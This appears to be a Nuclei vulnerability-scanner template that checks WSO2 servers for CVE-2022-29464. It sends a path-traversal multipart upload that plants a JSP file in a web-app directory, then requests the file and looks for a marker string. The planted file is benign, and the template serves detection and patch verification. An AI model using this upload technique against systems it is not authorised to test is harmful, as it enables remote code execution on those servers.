id: CVE-2022-29464
info:
  name: WSO2 Management - Arbitrary File Upload & Remote Code Execution
  author: luci,dhiyaneshDk
  severity: critical
  description: Certain WSO2 products are vulnerable to unrestricted file upload which
    results in remote code execution, affecting multiple versions of WSO2 API Manager,
    WSO2 Identity Server, WSO2 Identity Server Analytics, WSO2 Identity Server as
    Key Manager, and WSO2 Enterprise Integrator.
  reference:
  - https://shanesec.github.io/2022/04/21/Wso2-Vul-Analysis-cve-2022-29464/
  - https://docs.wso2.com/display/Security/Security+Advisory+WSO2-2021-1738
  - https://github.com/hakivvi/CVE-2022-29464
  - https://nvd.nist.gov/vuln/detail/CVE-2022-29464
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cve-id: CVE-2022-29464
    cwe-id: CWE-434
  metadata:
    shodan-query: http.favicon.hash:1398055326
    impact: The vulnerability CVE-2022-29464 in certain WSO2 products allows unrestricted
      file upload, resulting in remote code execution, which can have a significant
      impact on the security integrity of affected systems.
    recommendation: It is recommended to immediately update WSO2 products to the latest
      version to prevent unrestricted file upload and remote code execution vulnerabilities.
  tags: cve,cve2022,rce,fileupload,wso2,intrusive,kev
requests:
- raw:
  - 'POST /fileupload/toolsAny HTTP/1.1

    Host: {{Hostname}}

    Content-Type: multipart/form-data; boundary=---------------------------250033711231076532771336998311

    Content-Length: 348


    -----------------------------250033711231076532771336998311

    Content-Disposition: form-data; name="../../../../repository/deployment/server/webapps/authenticationendpoint/{{to_lower("{{randstr}}")}}.jsp";filename="test.jsp"

    Content-Type: application/octet-stream


    <% out.print("WSO2-RCE-CVE-2022-29464"); %>

    -----------------------------250033711231076532771336998311--

    '
  - 'GET /authenticationendpoint/{{to_lower("{{randstr}}")}}.jsp HTTP/1.1

    Host: {{Hostname}}

    '
  req-condition: true
  matchers:
  - type: dsl
    dsl:
    - contains(body_2, 'WSO2-RCE-CVE-2022-29464')
